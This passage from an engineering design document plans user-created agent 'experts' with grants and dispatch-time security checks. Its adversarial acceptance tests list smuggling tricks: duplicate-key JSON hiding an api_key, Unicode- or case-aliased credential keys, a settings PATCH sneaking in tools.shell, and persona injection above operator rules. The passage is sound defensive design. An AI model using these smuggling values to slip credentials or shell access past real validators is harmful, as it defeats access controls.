  parser-differential, Unicode/homoglyph (`ａｐｉ＿ｋｅｙ`), case/alias, type-confusion
  (JSON-in-string), cross-layer assembly.
- **Authoritative scan is on the merged result at dispatch** (decision 9) — the
  only point that sees cross-layer assembly, base drift, and the `persistent_agent`
  path. Apply size/depth/key-count caps before parse (recursive-payload DoS).

### Grants enforcement (decisions 8, 9, 21–23)

One PDP / two PEPs (decision 21); restrict-only scopes so a child can't widen a
parent cap (decision 22); append-only audit of grant changes (decision 23);
revocation bounded to next dispatch (CWE-367, accepted); shared experts under the
runner's grants (CWE-441). **Save-time is UX; dispatch-time is the boundary**
(OWASP A01). This matches the enterprise state of the art — ServiceNow
`invoke_from_ai` (pre-exec, no bypass) + Role-Masking (effective grants = the
intersection with the invoker).

## Slices (each independently shippable)

### Slice 1 — Table + resolution + selection end-to-end
- Migration `0028` (experts, project_experts, `jobs.expert_id`).
- CRUD + duplicate + **import/export** endpoints (no grants yet — hard-deny list
  only; creation admin-gated until S2 if we want belt-and-braces). Import routes
  through the create validator (fork-on-import); export serializes the raw
  fragment to a `config/schema.json` bundle. Upload/download UI buttons deferred
  to Slice 3 (decision 27).
- `/api/experts` merge + DB-aware `_load_expert_detail`.
- Agent: `EXPERTS_DB_ENABLED` flag, expert-by-id load, base-from-type merge,
  prompts layer in MatrixResolver, fail-loud on missing row.
- Dispatch plumbing: `expert_id` through job create, session create
  (provisioner env), automations.
- Reserve migration slot `0029` (by a note in `docs/db_migration.md`, **not** a
  placeholder file — the runner checksums applied migrations, so an edited
  placeholder would fail the drift guard); prompts-layer mechanism decided —
  inject persona/instructions into the existing `config.extra["_resolved_prompts"]`
  layer and overlay them into the `resolved_config` freeze.
- **Acceptance:** create an expert via API → run one job and one session with
  it on k3d → frozen `resolved_config` contains the fragment and the persona
  is in the system prompt; deleting the row fails the *next* run loudly;
  bundled experts unaffected with the flag off; an exported expert re-imports as
  a new owned row and runs.

### Slice 2 — Grants + enforcement
- Migration `0029` + catalog + grants service (user → project → global → default).
- Save-time 422; dispatch-time reject on the merged stack (incl.
  `persistent_agent`); admin bypass; `system_settings['user_experts']`
  kill-switch; `can_use_vm` reads switched to grants.
- Admin Users grants panel + `/api/users/me/capabilities`.
- **Acceptance:** non-granted user saving a `tools.shell` expert → 422 naming
  the key; grant revoked after save → next dispatch rejected with message; a
  `persistent_agent` settings PATCH smuggling `tools.shell` → session create
  rejected; VM gating behaves identically to the old column; admin bypasses.
- **Adversarial acceptance:** duplicate-key fragment
  `{"llm":{"api_key":null,"api_key":"x"}}` rejected; case/Unicode-aliased
  credential (`llm.apiKey`, fullwidth) rejected; a credential assembled across two
  innocuous layers caught at dispatch; `null`-deletion of a base guardrail caught;
  a user-scope grant exceeding a project ceiling refused (restrict-only).

### Slice 3 — Cockpit
- Experts page (list/create/edit/fork/delete), type-aware editor, greyed
  ungated controls fed by `/api/users/me/capabilities`, grant-fed model picker,
  picker integration (id-based, type-filtered, badges), project settings
  expert section (link/`default_for`; `config_override` is a **deferral lever** —
  ship link + default first, since no surveyed product layers a project override
  on a forked agent). Cockpit is ~75% reuse (datasources-list, agent-settings
  tool toggles, admin-config controls, admin-users grant toggle); watch the 32 kB
  component-style budget and defer Monaco — a plain textarea covers the raw flap.
- **Acceptance:** full lifecycle through the UI by a non-admin; bundled expert
  opens read-only with working fork; session-create shows only session
  experts; ungated controls visibly disabled, not hidden.

### Slice 4 — Iteration polish
- Version counter surfaced + `updated_by`; test-drive button; per-expert
  outcome stats on the detail page (success rate / avg phases from `jobs`
  by `expert_id`; cost column once the [[observability_and_quotas]] ledger
  lands); deprecate the Gitea `experts/` scan.
- **Acceptance:** editing an expert bumps the visible version and never
  changes an in-flight job; test-drive runs an unsaved draft; stats panel
  matches a hand-run SQL count.

### Deferred (explicitly out of v1)
- **AI-assisted "improve this expert"** — a builder/persistent session that
  reads the expert + transcripts of jobs that used it and proposes edits.
  Own design round once CRUD is proven.
- Live `$extends` chains between DB experts; per-model-family prompt variants
  in DB experts; per-expert `model_config_matrix` overlays; share-by-link;
  full version history/rollback; DB-aware subjob expert resolution +
  transitive grant checks for delegation chains; `publish_global` grant key; the `raw_config` grant key
  (decision 18); per-kind datasource grants (`datasource_sql`/`_mongodb`/`_graph`,
  decision 17); a project-level default *datasource set* applied at create,
  independent of the expert (decision 16); a persona safety classifier /
  red-team eval harness + author-time persona linting (v1 relies on fencing +
  config-gating, decision 7); `deleted_record` AFTER-DELETE recoverability if
  undo is ever wanted (not a `deleted_at` flag); externalizing the grant catalog
  to a policy engine (OPA) only if non-engineers must edit policy or key-count
  grows. Full version history, when built, follows the convergent shape:
  full-snapshot-per-version + active-version pointer + restore, `expert_type`
  frozen across versions.

## Anti-patterns (carried from v1, amended)

1. Mixing worker and session config in one expert — `expert_type` is immutable.
2. ~~Overwriting built-in DB rows on reload~~ → built-ins are **never in the
   DB**; the overlay makes reload-sync machinery unnecessary.
3. Storing resolved config in `experts.config` — fragments only; resolution at
   load time so base changes propagate.
4. Name as primary key — UUIDs; uniqueness is `(name, owner_id)`.
5. User-supplied `$extends` — the base is implied by `expert_type` (decision 4).
6. **New:** enforcing grants only at save time — revocation and shared experts
   make dispatch-time the check that matters; save-time is UX.
7. **New:** assuming dispatch already validates the chosen model — it does
   **not** (`_inject_model_credentials()` provider-infers unknown models at
   `main.py:2461`); `model_selection` (decision 19) is the first server-side
   model gate, which is why its default is permissive.
8. **New:** injecting a user persona at system-prompt altitude above operator
   rules — fence and subordinate it (decision 7); altitude ≠ authorship.
9. **New:** a deny-list as the *primary* credential gate, or scanning before
   canonicalization — allow-list binding is primary, canonicalize first
   (decisions 10, 25).
10. **New:** pure most-specific-wins on a grant *ceiling* — a user row could then
   exceed an admin cap; security keys are restrict-only (decision 22).

## Out of scope

- Quotas and spend limits → [[observability_and_quotas]] (`quota_limits`) and
  its billing follow-on. Same dispatch seam eventually, different evaluator.
- User preference storage → `users.settings` already exists; grants are
  deliberately a separate, admin-writable table.
- Org-level expert namespaces → [[multi_tenancy]] M2.

## Open questions

All five v1 open questions were resolved 2026-06-15 → **decisions 15–19**:

1. **Deletion semantics** → decision 15 (**block while live-referenced**: active
   threads + name-resolving automations; historical jobs never block).
2. **Project experts ↔ datasources** → decision 16 (**orthogonal**, no auto-attach).
3. **Datasource grant granularity** → decision 17 (**single `datasource_tools` key**).
4. **Editor advanced flap** → decision 18 (**admin-only in v1**; `raw_config` deferred).
5. **`model_selection` timing** → decision 19 (**enforce in S2**, default = all
   enabled, so it is a no-op until an admin narrows).

One residual hardening item surfaced during resolution — separate from this
feature, recorded here so it is not lost: tighten `_inject_model_credentials()`
(`main.py:2461`) so a *granted-but-unconfigured* model fails loud instead of
silently provider-inferring from the model string.

## References

- [[config_matrix_db_overrides]] — the overlay pattern this mirrors
  (migration `0022`, loader seam `src/core/loader.py:60-159`, admin editor).
- [[observability_and_quotas]] — `quota_limits` / `usage_rates` siblings;
  scope-polymorphic table convention `(scope_kind, scope_id, …)`.
- [[multi_tenancy]] — Tier 0 admission + visibility model the expert
  visibility rules compose with.
- `docs/db_migration.md` — migration file conventions (`0028`/`0029`,
  no `schema.sql` edits).
- `users.can_use_vm` — `_check_vm_permission` (`main.py:2129`), admin PATCH
  `admin_patch_user` (`main.py:18731`) — the grant pattern being generalized.
- `users.settings.persistent_agent` merge (`create_persistent_thread`,
  `main.py:12572-12620`) — the user-writable config path dispatch enforcement
  must cover.

### External (research pass 2026-06-15)

- **Merge / HTTP:** RFC 7396 JSON Merge Patch (merge semantics); RFC 9110
  §15.5.10 (409 Conflict for in-use delete); RFC 7493 I-JSON (duplicate-key).
- **Agent/persona security:** OpenAI Instruction Hierarchy (arXiv:2404.13208);
  OWASP LLM01/LLM06 + LLM Top-10; Microsoft Spotlighting (arXiv:2403.14720);
  persona-modulation jailbreak (arXiv:2311.03348).
- **Access control:** NIST SP 800-162 (ABAC); CWE-441 (confused deputy) / CWE-367
  (TOCTOU); Saltzer & Schroeder (complete mediation, fail-safe defaults); Cerbos
  scoped policies (`OVERRIDE_PARENT` vs `REQUIRE_PARENTAL_CONSENT`); OWASP A01 +
  `authz_change` logging vocabulary; Postgres `NULLS NOT DISTINCT` (PG15+).
- **Comparable architectures:** ServiceNow `invoke_from_ai` + Role-Masking and
  LangGraph Assistants (immutable `graph_id`) as direct analogs; OpenAI Custom
  GPTs / Anthropic Skills (fork-by-copy, two-tier publish); Brandur "Soft Deletion
  Probably Isn't Worth It" (deletion model).
